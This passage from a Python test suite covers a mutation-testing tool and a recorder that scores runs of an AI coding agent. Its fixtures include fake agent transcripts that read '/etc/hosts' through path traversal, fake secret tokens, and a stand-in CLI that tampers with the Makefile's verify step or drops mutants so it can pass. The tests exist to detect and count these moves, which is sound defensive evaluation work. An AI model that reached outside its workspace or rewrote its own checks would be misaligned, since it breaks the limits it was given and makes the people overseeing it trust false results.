        self.assertEqual((len(chosen), where, at_once), (25, ", of kernel/gate.py", mutants.FILTER_WORKERS))
        self.assertEqual(mutants.FILTER_WORKERS, 2)
        self.assertEqual(mutants.selected({}, ["./kernel/gate.py"], few)[0], chosen, "a path is read however spelt")
        self.assertEqual(mutants.selected({}, ["kernel//gate.py"], few)[0], chosen)
        dotted = [("d", ".github/workflows/verify.yml", "a\n", "b\n", ("tests.test_tools.Mutants",))]
        self.assertEqual(mutants.selected({}, [".github/workflows/verify.yml"], dotted)[0], dotted, "a dot is kept")
        with self.assertRaises(ValueError):
            mutants.selected({}, ["../kernel/gate.py"], few)
        self.assertEqual(mutants.selected({}, [], few), (few, "", None), "with no path, every mutant, as before")
        for environ, paths, said in (({}, ["kernel/gate.py", "kernel/brakes.py"], "a filtered run breaks at most 40"),
                                     ({}, ["kernel/nowhere.py"], "no mutant targets kernel/nowhere.py"),
                                     ({}, ["kernel/gate.py", "kernel/nowhere.py"], "no mutant targets kernel/nowhere.py"),
                                     ({"MUTANTS_SHARD": "0", "MUTANTS_SHARDS": "2"}, ["kernel/gate.py"], "do not mix"),
                                     ({"MUTANTS_SHARD": "0"}, ["kernel/gate.py"], "do not mix"),
                                     ({"MUTANTS_SHARDS": "2"}, ["kernel/gate.py"], "do not mix")):
            with self.assertRaises(ValueError, msg=paths) as raised:
                mutants.selected(environ, paths, few)
            self.assertIn(said, str(raised.exception), paths)
        self.assertEqual(mutants.FILTER_MOST, 40)
        # From the front door, too many mutants stop the run before any test runs; a shard CI set is not this run's.
        env = {name: value for name, value in os.environ.items() if not name.startswith("MUTANTS_")}
        done = subprocess.run([sys.executable, "-m", "tools.mutants", "kernel/derive.py"], cwd=str(ROOT), env=env,
                              capture_output=True, text=True, timeout=120)
        self.assertEqual(done.returncode, 1, done.stdout[-300:])
        self.assertIn("a filtered run breaks at most 40", done.stdout)

    def test_tests_that_fail_unbroken_stop_the_check_before_any_mutant(self):
        calls = []
        with contextlib.redirect_stdout(io.StringIO()) as said:
            code = mutants.main(mutate("fails"), tree({"k.py": "rule\n"}), told({"rule": (0, 1, FAILS_A_TEST)}, calls))
        self.assertEqual((code, calls), (1, ["rule", "done rule"]))
        self.assertIn("the tests fail before anything is broken", said.getvalue())

    def test_a_failure_the_mutant_causes_kills_it(self):
        code, lines, calls = self.check({"breaks": (0, 1, FAILS_A_TEST)}, ["breaks"])
        self.assertEqual((code, lines), (0, ["killed    breaks", "1 of 1 mutants killed"]))
        self.assertEqual(calls[2:], ["breaks", "done breaks", "breaks alone", "done breaks alone", "rule alone",
                                     "done rule alone"], "it failed again alone on the mutant, and passed alone unbroken")
        # From the front door: a test that reads the rule fails on its mutant whole and alone, and passes without it.
        root = suite_of("    def test_x(self):\n        self.assertEqual(open('k.py').read(), 'rule\\n')\n",
                        {"k.py": "rule\n"})
        with contextlib.redirect_stdout(io.StringIO()) as said:
            code = mutants.main(mutate("breaks"), root, mutants.suite, 1)
        self.assertEqual((code, said.getvalue().splitlines()), (0, ["killed    breaks", "1 of 1 mutants killed"]))

    def test_a_mutant_whose_only_failure_is_unrelated_survives(self):
        # A test failed under load on the mutant, and passes when run again: the suite runs once more, and passes.
        code, lines, calls = self.check({"unrelated": [(0, 1, FAILS_A_TEST), PASSES], "unrelated alone": PASSES},
                                        ["unrelated"])
        self.assertEqual((code, lines), (1, ["SURVIVED  unrelated", "0 of 1 mutants killed"]))
        self.assertEqual([c for c in calls if not c.startswith("done ")],
                         ["rule", "unrelated", "unrelated alone", "rule alone", "unrelated"])
        # From the front door: a test that fails on its second run, the first on the mutant, and on no other.
        root = suite_of("    def test_x(self):\n        with open(os.environ['COUNTED'], 'a+') as runs:\n"
                        "            runs.write('.')\n            runs.seek(0)\n"
                        "            self.assertNotEqual(runs.read(), '..')\n", {"k.py": "rule\n"})
        counted = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "counted"
        with mock.patch.dict(os.environ, {"COUNTED": str(counted)}), \
                contextlib.redirect_stdout(io.StringIO()) as said:
            code = mutants.main(mutate("unrelated"), root, mutants.suite, 1)
        self.assertEqual((code, said.getvalue().splitlines()), (1, ["SURVIVED  unrelated", "0 of 1 mutants killed"]))
        self.assertEqual(counted.read_text(), "." * 5, "unbroken, whole, alone, alone unbroken, whole again")

    def test_a_test_that_fails_on_the_unbroken_code_too_kills_nothing(self):
        code, lines, _ = self.check({"x": (0, 1, FAILS_A_TEST), "rule alone": (0, 1, FAILS_A_TEST)}, ["x"])
        self.assertEqual((code, lines), (1, ["FLAKY     x (tests.test_x.T.test_x failed on the unbroken code too%s)" % MEND,
                                             "0 of 1 mutants killed"]))

    def test_a_test_that_fails_only_in_a_copy_kills_nothing(self):
        # The checkout has a .git, and a copy has none: the test fails on every mutant and passes where the tests were
        # first run, so only the unbroken code in the same copy shows it is not the mutant's.
        root = suite_of("    def test_x(self):\n        self.assertTrue(os.path.exists('.git'))\n",
                        {"k.py": "rule\n", ".git/HEAD": "ref: refs/heads/main\n"})
        with contextlib.redirect_stdout(io.StringIO()) as said:
            code = mutants.main(mutate("anything"), root, mutants.suite, 1)
        self.assertEqual((code, said.getvalue().splitlines()),
                         (1, ["FLAKY     anything (tests.test_x.T.test_x failed on the unbroken code too%s)" % MEND,
                              "0 of 1 mutants killed"]))

    def test_a_mutant_leaves_no_trace_in_the_copy_the_next_one_is_lent(self):
        # However its runs end, a crash or a hang among them, a mutant's file is put back byte for byte, and the next
        # mutant is lent the same copy: one is made for each worker, not one for each mutant.
        root = tree({"k.py": "rule\n"})
        seen = []

        def run(work, first=(), only=None):
            said = (work / "k.py").read_bytes()
            seen.append((work, said))
            if said == b"crashes\n":
                raise OSError("the runner died")
            if said == b"hangs\n":
                return None, ""
            return (0, "OK\n") if said == b"rule\n" else (1, FAILS_A_TEST)
        with contextlib.redirect_stdout(io.StringIO()) as said:
            code = mutants.main(mutate("crashes", "hangs", "breaks", "breaks too"), root, run, 1)
        self.assertEqual((code, said.getvalue().splitlines()), (1, [
            "ERROR     crashes (the run failed with OSError: the runner died%s)" % AGAIN,
            "ERROR     hangs (the run took longer than %d s%s)" % (mutants.TIMEOUT, AGAIN),
            "killed    breaks", "killed    breaks too", "2 of 4 mutants killed"]))
        self.assertEqual(len({work for work, _ in seen} - {root}), 1, "one copy, lent to each mutant in turn")
        self.assertEqual([text for work, text in seen if work != root],
                         [b"crashes\n", b"hangs\n", b"breaks\n", b"breaks\n", b"rule\n", b"breaks too\n", b"breaks too\n",
                          b"rule\n"], "each mutant found the file as the tree has it, and its unbroken side too")
        # A copy left changed is an ERROR for the mutant it is lent to, and is never lent again.
        trees = mutants.Trees(root, tempfile.mkdtemp(dir=SCRATCH.name))
        with trees.lent() as left:
            (left / "k.py").write_text("rule\nleft\n")
        outcome, why = mutants.guarded(mutate("next")[0], root, run, trees)
        self.assertEqual(outcome, "ERROR")
        self.assertIn("k.py in this copy is not the tree's", why)
        self.assertEqual(mutants.guarded(mutate("next")[0], root, run, trees), ("killed", ""))
        self.assertNotEqual(seen[-1][0], left, "a fresh copy was made in its place")
        # A copy whose target cannot be read is an ERROR for the mutant it is lent to, and is never lent again.
        with trees.lent() as missing:
            (missing / "k.py").unlink()
        outcome, why = mutants.guarded(mutate("next")[0], root, run, trees)
        self.assertEqual(outcome, "ERROR")
        self.assertIn("k.py could not be read in this copy", why)
        self.assertEqual(mutants.guarded(mutate("next")[0], root, run, trees), ("killed", ""))
        self.assertNotEqual(seen[-1][0], missing, "a fresh copy was made in its place")
        self.assertEqual(min(os.cpu_count() or 1, mutants.WORKERS), min(os.cpu_count() or 1, 4))

    def test_a_failure_that_is_not_the_mutants_twice_is_flaky_and_fails_the_check(self):
        code, lines, calls = self.check({"x": (0, 1, FAILS_A_TEST), "x alone": PASSES, "y": (0, 1, FAILS_A_TEST)},
                                        ["x", "y"])
        self.assertEqual(lines, ["FLAKY     x (tests.test_x.T.test_x passed when run again on the mutant%s)" % MEND,
                                 "killed    y", "1 of 2 mutants killed"])
        self.assertEqual((code, calls.count("x"), calls.count("x alone")), (1, 2, 2), "the suite ran twice on it")
        # A run alone that hangs or crashes is an ERROR, as any other run is: never killed, and never FLAKY.
        code, lines, calls = self.check({"x": (0, 1, FAILS_A_TEST), "x alone": (0, None, "")}, ["x"])
        self.assertEqual(lines[0], "ERROR     x (the run took longer than %d s%s)" % (mutants.TIMEOUT, AGAIN))
        self.assertNotIn("rule alone", calls, "the unbroken run was skipped when the mutant run errored")
        code, lines, _ = self.check({"x": (0, 1, FAILS_A_TEST), "rule alone": (0, None, "")}, ["x"])
        self.assertEqual(lines[0], "ERROR     x (the run took longer than %d s%s)" % (mutants.TIMEOUT, AGAIN))

    def test_the_failing_test_is_read_from_the_line_each_python_prints(self):
        lines = {
            "FAIL: test_x (tests.m.T)": "tests.m.T.test_x",                     # 3.9 and 3.10
            "FAIL: test_x (tests.m.T.test_x)": "tests.m.T.test_x",              # 3.11 and later
            "ERROR: test_x (tests.m.T)": "tests.m.T.test_x",
            "FAIL: test_x (tests.m.T) [one] (i=1)": "tests.m.T.test_x",         # a subtest
            "FAIL: test_x (tests.m.T.test_x) (i=1)": "tests.m.T.test_x",
            "ERROR: setUpClass (tests.m.T)": "tests.m.T",                       # the class
            "FAIL: test_x (tests.m.T)\nFAIL: test_x (tests.m.T.test_x)": "tests.m.T.test_x",
            "FAIL: test_x (tests.m.T)\nFAIL: test_y (tests.m.T)": None,          # two tests: which is unknown
            "FAILED (failures=1)": None,
            "FAIL: test x (tests.m.T)": None,
        }
        for said, test in lines.items():
            output = "F\n" + "".join("%s\n%s\n%s\nAssertionError\n" % ("=" * 70, line, "-" * 70)
                                     for line in said.splitlines())
            self.assertEqual(mutants.failed_test(output), test, said)
        # A line of that form in a test's own message is not unittest's.
        output = "F\n%s\nFAIL: test_x (tests.m.T)\n%s\nAssertionError: FAIL: test_y (tests.m.T)\nFAIL: test_y (tests.m.T)\n"
        self.assertEqual(mutants.failed_test(output % ("=" * 70, "-" * 70)), "tests.m.T.test_x")
        # The line this Python prints.
        status, output = mutants.suite(suite_of("    def test_x(self):\n        self.fail()\n"))
        self.assertEqual(mutants.failed_test(output), "tests.test_x.T.test_x")
        # A failure whose test cannot be read is an ERROR, and kills nothing.
        code, lines, _ = self.check({"x": (0, 1, "F\nFAILED (failures=1)\n")}, ["x"])
        self.assertEqual(lines[0], "ERROR     x (the one test that failed cannot be read from the output%s)" % AGAIN)

    def test_every_test_timed_by_the_wall_clock_is_marked_and_skipped_when_mutating(self):
        # A test that reads the clock, or sleeps, can fail under load for its own reasons, and must not kill a mutant.
        clock = {"monotonic", "monotonic_ns", "perf_counter", "perf_counter_ns", "time", "time_ns", "sleep"}
        # tests/support.py's assertions that judge a measured spend by the clock and the load (issue 253). Spent alone
        # measures CPU, which load does not change, and its pure judgments, over and faster_than_linear, read no clock.
        judging = {"within", "linear", "grows_linearly"}

        def dotted(node) -> str:
            """The dotted name an expression is, such as tests.support, or "" for anything else."""
            if isinstance(node, ast.Name):
                return node.id
            if isinstance(node, ast.Attribute):
                head = dotted(node.value)
                return head + "." + node.attr if head else ""
            return ""
        marked, reads = set(), set()
        for path in sorted((ROOT / "tests").glob("test_*.py")):
            module = ast.parse(path.read_text())
            # time under any name it is imported as, and any of its clocks imported on their own
            modules = {a.asname or a.name for n in ast.walk(module) if isinstance(n, ast.Import) for a in n.names
                       if a.name == "time"}
            bare = {name for n in ast.walk(module) if isinstance(n, ast.ImportFrom) and n.module == "time"
                    for a in n.names for name in (clock if a.name == "*" else [a.asname or a.name] if a.name in clock else [])}
            judges = {a.asname or a.name for n in ast.walk(module) if isinstance(n, ast.ImportFrom)
                      and n.module == "tests.support" for a in n.names if a.name in judging}
            # The module itself, however imported, so support.within(...) is read as within(...) is (Muse on PR 257).
            supports = ({a.asname or a.name for n in ast.walk(module) if isinstance(n, ast.ImportFrom)
                         and n.module == "tests" for a in n.names if a.name == "support"}
                        | {a.asname or a.name for n in ast.walk(module) if isinstance(n, ast.Import) for a in n.names
                           if a.name == "tests.support"})     # `import tests.support` is read as tests.support (Codex)
            for owner in [n for n in ast.walk(module) if isinstance(n, ast.ClassDef)]:
                for node in owner.body:
                    if not isinstance(node, ast.FunctionDef) or not node.name.startswith("test_"):
                        continue
                    where = (path.name, owner.name, node.name)
                    if any("wall_clock" in ast.dump(d) for d in node.decorator_list):
                        marked.add(where)
                    if any((isinstance(n, ast.Attribute) and isinstance(n.value, ast.Name) and n.value.id in modules
                            and n.attr in clock) or (isinstance(n, ast.Name) and n.id in bare)
                           or (isinstance(n, ast.Call) and isinstance(n.func, ast.Name) and n.func.id in judges)
                           or (isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute) and n.func.attr in judging
                               and dotted(n.func.value) in supports)
                           for n in ast.walk(node)):
                        reads.add(where)
        # The order of the runs is told by a stand-in that sleeps: that test reads no clock of its own.
        timed = reads | {("test_tools.py", "Mutants", "test_mutants_are_reported_in_their_order_however_their_runs_finish")}
        self.assertEqual(marked, timed, "mark @wall_clock, from tests/support.py, the tests timed by it and no other")
        self.assertIn(("test_hooks.py", "ProtectedPaths", "test_a_wildcard_that_would_backtrack_is_read_within_the_budget"),
                      marked)

        def test_x():
            pass
        with mock.patch.dict(os.environ, {"MUTATING": "1"}):
            self.assertTrue(getattr(support.wall_clock(test_x), "__unittest_skip__", False))
        with mock.patch.dict(os.environ, {"MUTATING": ""}):
            self.assertIs(support.wall_clock(test_x), test_x, "in make verify it runs as it is")


class ContextEval(unittest.TestCase):
    """`tools/context_eval.py`, the record of one run of the context's test (issue 8): what it takes from the CLI's
    transcript and the export, and that no word of the model's reaches it."""

    PROSE = {"said": "the model wrote THIS-PROSE-1 in a text block", "result": "THIS-PROSE-2 in a tool's result",
             "answer": "THIS-PROSE-3 as the answer", "command": "THIS-PROSE-4 inside a command",
             "stderr": "THIS-PROSE-5 on standard error"}

    def export(self, changed=True) -> tuple:
        """A pristine export and the agent's copy of it, with the rule, its test and its mutant added to the copy."""
        pristine = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        work = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        files = {"AGENTS.md": "# a repo\n", "kernel/AGENTS.md": "# kernel\n", "kernel/derive.py": "def derive(f):\n    return f\n",
                 "tests/test_decide.py": "import unittest\n\n\nclass T(unittest.TestCase):\n    def test_one(self):\n        pass\n",
                 "tools/mutants.py": 'DERIVE = "kernel/derive.py"\nMUTANTS = [\n    ("a rule", DERIVE, "a", "b", ("t",)),\n]\n'}
        for folder in (pristine, work):
            for rel, text in files.items():
                (folder / rel).parent.mkdir(parents=True, exist_ok=True)
                (folder / rel).write_text(text)
        if changed:
            (work / "kernel/derive.py").write_text('def derive(f):\n    if not f:\n        return "empty_diff"\n    return f\n')
            (work / "tests/test_decide.py").write_text((work / "tests/test_decide.py").read_text()
                                                       + "\n    def test_empty_diff_never_converges(self):\n        pass\n")
            (work / "tools/mutants.py").write_text('DERIVE = "kernel/derive.py"\nMUTANTS = [\n    ("a rule", DERIVE, "a", "b", ("t",)),\n'
                                                   '    ("an empty diff converges", DERIVE, "c", "d", ("t",)),\n]\n')
        return pristine, work

    def transcript(self, work) -> str:
        def assistant(*blocks):
            return json.dumps({"type": "assistant", "message": {"role": "assistant", "content": list(blocks)}})
        lines = [
            json.dumps({"type": "system", "subtype": "init", "cwd": str(work), "tools": ["Read", "Bash"]}),
            assistant({"type": "text", "text": self.PROSE["said"]},
                      {"type": "tool_use", "id": "t1", "name": "Read", "input": {"file_path": str(work / "AGENTS.md")}}),
            json.dumps({"type": "user", "message": {"content": [{"type": "tool_result", "tool_use_id": "t1", "content": self.PROSE["result"]}]}}),
            assistant({"type": "tool_use", "id": "t2", "name": "Read", "input": {"file_path": "kernel/AGENTS.md"}},
                      {"type": "tool_use", "id": "t3", "name": "Read", "input": {"file_path": "/etc/hosts"}},
                      {"type": "tool_use", "id": "t4", "name": "Bash", "input": {"command": "python3 -m unittest tests.test_decide"}},
                      {"type": "tool_use", "id": "t5", "name": "Bash", "input": {"command": 'echo "%s"' % self.PROSE["command"]}},
                      {"type": "tool_use", "id": "t8", "name": "Read", "input": {"file_path": "kernel/../../etc/hosts"}},
                      {"type": "tool_use", "id": "t9", "name": "Bash", "input": {"command": "python3 run.py lowercase-token-0123456789abcdef then"}},
                      {"type": "tool_use", "id": "t10", "name": "Bash", "input": {"command": "gh" + "p_0123456789abcdefghijklmnopqrstuvwxyz"}},
                      {"type": "tool_use", "id": "t6", "name": "Edit", "input": {"file_path": str(work / "kernel" / "derive.py"), "old_string": "x", "new_string": self.PROSE["said"]}},
                      {"type": "tool_use", "id": "t7", "name": "Read", "input": {"file_path": str(work / "AGENTS.md")}}),
            json.dumps({"type": "result", "subtype": "success", "is_error": False, "num_turns": 7, "duration_ms": 1234,
                        "total_cost_usd": 0.25, "usage": {"input_tokens": 100, "output_tokens": 20}, "result": self.PROSE["answer"]}),
        ]
        return "\n".join(lines) + "\n"

    META = {"commit": "9bfc81383b36f8613d9f4a25e9377046aff27a92", "ran_at": "2026-10-21T09:00:00Z", "cli_version": "2.1.302",
            "cap_turns": 80, "code": "empty_diff"}
    PASSED = {"held_out_test": "pass", "verify": "pass", "mutant": "killed"}

    def test_the_record_holds_paths_counts_and_verdicts_and_no_model_text(self):
        pristine, work = self.export()
        run = context_eval.record(self.transcript(work), pristine, work, self.PASSED, self.META)
        self.assertIsNotNone(run)
        self.assertEqual(validate(run, context_eval.RUN_SCHEMA), [])
        # A path is read once, relative to the export; one outside it, by its root or by `..`, is dropped and counted; a
        # command keeps its first words, and stops at a word that is not one or that is shaped like a token; one with
        # no such word is unreadable, and counted; the result's counts are the cost.
        self.assertEqual(run["read"], ["AGENTS.md", "kernel/AGENTS.md", "kernel/derive.py"])
        self.assertEqual(run["outside_reads"], 2)
        self.assertEqual(run["ran"], ["python3 -m unittest tests.test_decide", "echo", "python3 run.py", "unreadable"])
        self.assertEqual(run["unread_commands"], 1)
        self.assertEqual(run["restored"], [])
        self.assertEqual(run["cost"], {"turns": 7, "duration_ms": 1234, "usd": 0.25, "input_tokens": 100, "output_tokens": 20})
        self.assertEqual(run["changed"], [{"path": "kernel/derive.py", "added": 2, "removed": 0},
                                          {"path": "tests/test_decide.py", "added": 3, "removed": 0},
                                          {"path": "tools/mutants.py", "added": 1, "removed": 0}])
        self.assertEqual(run["added"], {"test": "tests/test_decide.py::test_empty_diff_never_converges",
                                        "mutant": "an empty diff converges", "reason": "empty_diff"})
        self.assertEqual((run["verdicts"], run["passed"]), (self.PASSED, True))
        for word in self.PROSE.values():
            self.assertNotIn(word, json.dumps(run))
        # A verdict that fails, fails the run; the code that is not in the Kernel's change is not the reason added.
        failed = context_eval.record(self.transcript(work), pristine, work, dict(self.PASSED, mutant="survived"), self.META)
        self.assertEqual((failed["verdicts"]["mutant"], failed["passed"]), ("survived", False))
        unchanged = context_eval.record(self.transcript(work), *self.export(changed=False), self.PASSED, self.META)
        self.assertEqual((unchanged["changed"], unchanged["added"]), ([], {"test": None, "mutant": None, "reason": None}))
        # The code is the reason added only on a line the agent added to the Kernel, as a whole word.
        (work / "kernel/derive.py").write_text('def derive(f):\n    if not f:\n        return "empty_diff_x"\n    return f\n')
        self.assertIsNone(context_eval.record(self.transcript(work), pristine, work, self.PASSED, self.META)["added"]["reason"])
        # A mutant dropped from the list cannot have been killed: the judge's verdict is overridden. A mutant named
        # like a token is not recorded. What the judge put back is carried.
        (work / "tools/mutants.py").write_text('DERIVE = "kernel/derive.py"\nMUTANTS = [\n    ("an empty diff converges", DERIVE, "c", "d", ("t",)),\n]\n')
        dropped = context_eval.record(self.transcript(work), pristine, work, self.PASSED, self.META)
        self.assertEqual((dropped["verdicts"]["mutant"], dropped["passed"]), ("survived", False))
        (work / "tools/mutants.py").write_text('DERIVE = "kernel/derive.py"\nMUTANTS = [\n    ("a rule", DERIVE, "a", "b", ("t",)),\n'
                                               '    ("gh' + 'p_0123456789abcdefghijklmnopqrstuvwxyz", DERIVE, "c", "d", ("t",)),\n]\n')
        self.assertIsNone(context_eval.record(self.transcript(work), pristine, work, self.PASSED, self.META)["added"]["mutant"])
        # A name in the house style, with a Hold's capital, a comma and a parenthesis, is recorded; one too long is not.
        (work / "tools/mutants.py").write_text('DERIVE = "kernel/derive.py"\nMUTANTS = [\n    ("a rule", DERIVE, "a", "b", ("t",)),\n'
                                               '    ("a Hold under a merge is done, not held (issue 237)", DERIVE, "c", "d", ("t",)),\n]\n')
        self.assertEqual(context_eval.record(self.transcript(work), pristine, work, self.PASSED, self.META)["added"]["mutant"],
                         "a Hold under a merge is done, not held (issue 237)")
        # A change under a dot-directory is seen, and a transcript with no result is recorded with its cost unknown.
        (work / ".github").mkdir()
        (work / ".github" / "x.yml").write_text("on: push\n")
        seen = context_eval.record(self.transcript(work), pristine, work, self.PASSED, self.META)
        self.assertIn({"path": ".github/x.yml", "added": 1, "removed": 0}, seen["changed"])
        no_result = "\n".join(self.transcript(work).splitlines()[:-1])
        unknown = context_eval.record(no_result, pristine, work, self.PASSED, self.META)
        self.assertEqual(unknown["cost"], {"turns": None, "duration_ms": None, "usd": None, "input_tokens": None, "output_tokens": None})
        put_back = context_eval.record(self.transcript(work), pristine, work, self.PASSED, dict(self.META, restored=["Makefile"]))
        self.assertEqual(put_back["restored"], ["Makefile"])

    def test_what_cannot_be_read_makes_no_record(self):
        pristine, work = self.export()
        text = self.transcript(work)
        self.assertIsNone(context_eval.record(text, pristine, work, "pass", self.META))
        self.assertIsNone(context_eval.record(text, pristine, work, self.PASSED, dict(self.META, commit="short")))
        self.assertIsNone(context_eval.record(text, pristine, work, {"held_out_test": "pass"}, self.META))
        # A transcript with no JSON reads nothing.
        read, ran, counts, outside = context_eval.reads_and_commands("the model said " + self.PROSE["said"], work)
        self.assertEqual((read, ran, counts, outside), ([], [], {}, 0))
        # The CLI's json form, one list, is read as the stream is.
        as_list = json.dumps([json.loads(line) for line in text.splitlines()])
        self.assertEqual(context_eval.record(as_list, pristine, work, self.PASSED, self.META)["read"],
                         ["AGENTS.md", "kernel/AGENTS.md", "kernel/derive.py"])

    def test_the_front_door_refuses_a_transcript_inside_the_repo_and_writes_the_record(self):
        pristine, work = self.export()
        folder = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        (folder / "raw").write_text(self.transcript(work))
        (folder / "verdicts.json").write_text(json.dumps(self.PASSED))
        (folder / "meta.json").write_text(json.dumps(self.META))
        out = folder / "record.json"
        # The scratch directory the recorder is told is its own: everything it reads and writes lies under it, and the
        # repo does not, wherever the repo is (under the mutation check it is a copy under the system's own scratch).
        scratch = pathlib.Path(SCRATCH.name).resolve()
        args = ["record", str(folder / "raw"), str(pristine), str(work), str(folder / "verdicts.json"), str(folder / "meta.json"), str(out)]
        with mock.patch("sys.stdout", io.StringIO()):
            self.assertEqual(context_eval.main(args, base=scratch), 0)
        self.assertTrue(json.loads(out.read_text())["passed"])
        with mock.patch("sys.stderr", io.StringIO()) as said:
            self.assertEqual(context_eval.main(["record", str(ROOT / "AGENTS.md")] + args[2:], base=scratch), 2)
            self.assertEqual(context_eval.main(args[:-1] + [str(ROOT / "never.json")], base=scratch), 2)
            self.assertEqual(context_eval.main(args, base=folder), 2, "the exports are outside the base given")
            self.assertEqual(context_eval.main(["record", str(folder / "none")] + args[2:], base=scratch), 2)
            self.assertEqual(context_eval.main(["record"], base=scratch), 2)
            self.assertEqual(context_eval.main(["mutants", str(ROOT / "tools"), str(work)], base=scratch), 2)
        self.assertFalse((ROOT / "never.json").exists())
        self.assertIn("outside the repo", said.getvalue())
        self.assertNotIn(str(ROOT), said.getvalue(), "the refusal names no path")
        with mock.patch("sys.stdout", io.StringIO()) as said:
            self.assertEqual(context_eval.main(["mutants", str(pristine), str(work)], base=scratch), 0)
        self.assertEqual(json.loads(said.getvalue()), {"names": ["an empty diff converges"], "targets": ["kernel/derive.py"]})


class ContextEvalScript(unittest.TestCase):
    """`tools/context_eval.sh`, run against a stand-in CLI and a stand-in repo, never the real ones: the environment
    the CLI is given, each refusal before anything is asked, the judge's three verdicts, and the record with no word
    of the model's in it."""

    SCRIPT = ROOT / "tools" / "context_eval.sh"
    PIN = re.search(r"^PIN=(\S+)$", SCRIPT.read_text(), re.M).group(1)
    PROSE = ContextEval.PROSE
    SENTENCE = "An empty diff never converges, with the reason `empty_diff`."
    # The stand-in CLI: it answers its version, and on a prompt it edits the export as an agent would, records the
    # environment and arguments it was given beside itself, and prints a transcript holding the model's words.
    STAND_IN = """#!/bin/sh
here=$(cd "$(dirname "$0")" && pwd)
case "$1" in
  --version) env > "$here/env-version"; cat "$here/version"; exit 0 ;;
  -p) env > "$here/env-task"; printf '%s\\n' "$@" > "$here/args"; pwd > "$here/cwd"
      [ -f "$here/tamper" ] && printf 'verify:\\n\\t@echo tampered\\n' > Makefile
      [ -f "$here/survive" ] && cp "$here/survive" tools/survive
      printf 'def rule(f):\\n    return "empty_diff"\\n' >> kernel/derive.py
      printf '\\n    def test_empty_diff_never_converges(self):\\n        pass\\n' >> tests/test_decide.py
      python3 - <<'PY'
p = "tools/mutants.py"; s = open(p).read()
open(p, "w").write(s.replace("]\\n", '    ("an empty diff converges", DERIVE, "c", "d", ("t",)),\\n]\\n', 1))
PY
      cat "$here/transcript"; cat "$here/stderr" >&2; exit 0 ;;
esac
exit 9
"""
    # The stand-in repo's mutation check: it kills every mutant its list holds, but one named in tools/survive, and
    # says so as the real one does, with the real one's exit.
    MUTANTS_PY = '''import os, sys
DERIVE = "kernel/derive.py"
MUTANTS = [
    ("a rule", DERIVE, "a", "b", ("t",)),
'''
    MUTANTS_MAIN = '''
survive = open("tools/survive").read().split("\\n") if os.path.exists("tools/survive") else []
killed = 0
for name, *_ in MUTANTS:
    outcome = "SURVIVED" if name in survive else "killed"
    killed += outcome == "killed"
    print("%-9s %s" % (outcome, name))
print("%d of %d mutants killed" % (killed, len(MUTANTS)))
sys.exit(0 if killed == len(MUTANTS) else 1)
'''

    def setUp(self):
        self.home = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        self.cfg = self.home.parent / (self.home.name + "-cfg")
        self.cfg.mkdir()
        self.out = self.home.parent / (self.home.name + "-out")
        self.aside = self.home.parent / (self.home.name + "-aside")
        self.aside.mkdir()
        (self.aside / "sentence").write_text(self.SENTENCE + "\n")
        (self.aside / "test_held_out.py").write_text("import unittest\nfrom kernel import derive\n\n\nclass HeldOut(unittest.TestCase):\n"
                                                    "    def test_the_rule_holds(self):\n        self.assertEqual(derive.rule({}), 'empty_diff')\n")

    # The stand-in repo's verify passes only once the held-out test has been taken out again.
    def repo(self, verify="verify:\n\t@test ! -f tests/test_held_out.py\n") -> tuple:
        """A stand-in repo with one commit: an AGENTS.md, a Kernel, a test, a mutation check and a Makefile."""
        folder = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        files = {"AGENTS.md": "# a repo\n", "Makefile": verify, "kernel/__init__.py": "", "kernel/derive.py": "def derive(f):\n    return f\n",
                 "tests/__init__.py": "", "tests/test_decide.py": "import unittest\n\n\nclass T(unittest.TestCase):\n    def test_one(self):\n        pass\n",
                 "tools/__init__.py": "", "tools/mutants.py": self.MUTANTS_PY + "]\n" + self.MUTANTS_MAIN}
        for rel, text in files.items():
            (folder / rel).parent.mkdir(parents=True, exist_ok=True)
            (folder / rel).write_text(text)
        env = {"PATH": os.environ["PATH"], "HOME": str(self.home), "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.invalid",
               "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@example.invalid", "GIT_CONFIG_NOSYSTEM": "1"}
        for args in (["init", "-q"], ["add", "-A"], ["commit", "-q", "-m", "one"]):
            subprocess.run(["git", "-C", str(folder), *args], env=env, check=True, capture_output=True)
        commit = subprocess.run(["git", "-C", str(folder), "rev-parse", "HEAD"], env=env, check=True, capture_output=True, text=True).stdout.strip()
        return folder, commit

    def stand_in(self, version=None, tamper=False, survive=None) -> pathlib.Path:
        folder = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)).resolve()
        (folder / "version").write_text("%s (Claude Code)\n" % (version or self.PIN))
        if tamper:
            (folder / "tamper").write_text("")
        if survive:
            (folder / "survive").write_text(survive + "\n")
        (folder / "stderr").write_text(self.PROSE["stderr"] + "\n")
        (folder / "transcript").write_text(ContextEval().transcript(pathlib.Path("/nowhere")).replace("/nowhere/", ""))
        cli = folder / "claude"
        cli.write_text(self.STAND_IN)
        cli.chmod(0o755)
        return folder

    def run_script(self, out, cfg, repo, commit, sentence, held_out, cli) -> subprocess.CompletedProcess:
        env = {"PATH": os.environ["PATH"], "HOME": str(self.home), "LANG": "C",
               "ANTHROPIC_API_KEY": "sk-" + "ant-" + "api03-NEVER-SEEN", "GH_TOKEN": "gh" + "p_NEVER-SEEN"}
        return subprocess.run(["bash", str(self.SCRIPT), str(out), str(cfg), str(repo), commit, str(sentence), str(held_out), str(cli)],
                              cwd=SCRATCH.name, capture_output=True, text=True, env=env, timeout=300)

    def texts(self, out) -> dict:
        return {p.name: p.read_text() for p in pathlib.Path(out).iterdir()}

    def test_a_run_is_judged_and_recorded_with_no_model_text(self):
        folder, commit = self.repo()
        cli = self.stand_in()
        ran = self.run_script(self.out, self.cfg, folder, commit, self.aside / "sentence", self.aside / "test_held_out.py", cli / "claude")
        self.assertEqual(ran.returncode, 0, ran.stderr + ran.stdout)
        named = {"HOME", "USER", "LOGNAME", "SHELL", "PATH", "TMPDIR", "LANG", "CLAUDE_CONFIG_DIR", "DISABLE_AUTOUPDATER"}
        for call in ("version", "task"):
